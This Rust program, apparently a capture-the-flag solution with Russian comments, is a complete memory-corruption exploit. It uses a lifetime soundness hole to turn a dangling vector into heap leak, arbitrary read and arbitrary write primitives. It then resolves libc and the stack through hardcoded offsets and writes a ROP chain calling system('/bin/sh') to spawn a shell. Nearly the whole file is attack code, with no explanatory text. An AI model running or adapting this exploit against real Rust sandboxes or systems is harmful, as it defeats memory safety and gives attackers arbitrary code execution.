#[inline(never)]
pub const fn lifetime_translator<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b T) -> &'a T {
    val_b
}

#[inline(never)]
pub fn lifetime_translator_mut<'a, 'b, T: ?Sized>(
    _val_a: &'a &'b (),
    val_b: &'b mut T,
) -> &'a mut T {
    val_b
}

pub fn expand<'a, 'b, T: ?Sized>(x: &'a T) -> &'b T {
    let f: for<'x> fn(_, &'x T) -> &'b T = lifetime_translator;
    f(STATIC_UNIT, x)
}

pub fn expand_mut<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lifetime_translator_mut;
    f(STATIC_UNIT, x)
}

pub const STATIC_UNIT: &&() = &&();

fn main() {
    let v = {
        // создаем вектор со статическим lifetime с размером буфера 24 байт
        let mut a = vec![];
        for _ in 0..8 {
            a.push([0u8; 3]);
        }
        let r = &mut a;
        expand_mut(r)
    };

    // вектор векторов на хипе
    let mut vv = vec![vec![1337u64]];

    fn read_address(v: &[[u8; 3]]) -> u64 {
        // чтение 8 байт с оффсета 8 и превращение их в число
        let mut buf = [0u8; 8];
        for i in 0..8 {
            buf[i] = v[(i + 8) / 3][(i + 8) % 3];
        }
        u64::from_le_bytes(buf)
    }

    fn write_address(v: &mut [[u8; 3]], addr: u64) {
        // запись 8-байтового числа по оффсету 8
        let buf = addr.to_le_bytes();
        for i in 0..8 {
            v[(i + 8) / 3][(i + 8) % 3] = buf[i];
        }
    }

    let heap_leak = read_address(v);

    let mut arbitrary_read = |addr| -> u64 {
        write_address(v, addr);
        vv[0][0]
    };

    println!("HEAP LEAK 0x{:x}", heap_leak);

    let mut libc_leak_address = heap_leak;
    while arbitrary_read(libc_leak_address) & 0xfff != 0x4e0 {
        libc_leak_address -= 8;
    }

    let libc_leak = arbitrary_read(libc_leak_address);
    let libc_base = libc_leak - 0x1e84e0;
    println!("LIBC BASE 0x{:x}", libc_base);
    let environ = arbitrary_read(libc_base + 0x1EEE28);
    println!("ENVIRON 0x{:x}", environ);
    let stack = environ - 0x300;

    let mut arbitrary_write = |addr, value| {
        write_address(v, addr);
        vv[0][0] = value;
    };

    let system = libc_base + 0x53110;
    let bin_sh = libc_base + 0x1A7EA4;
    let pop_rdi = libc_base + 0x2a145;
    let ret = libc_base + 0x2a145 + 1;
    arbitrary_write(stack, pop_rdi);
    arbitrary_write(stack + 8, bin_sh);
    arbitrary_write(stack + 16, ret);
    arbitrary_write(stack + 24, system);

    write_address(v, heap_leak);
}
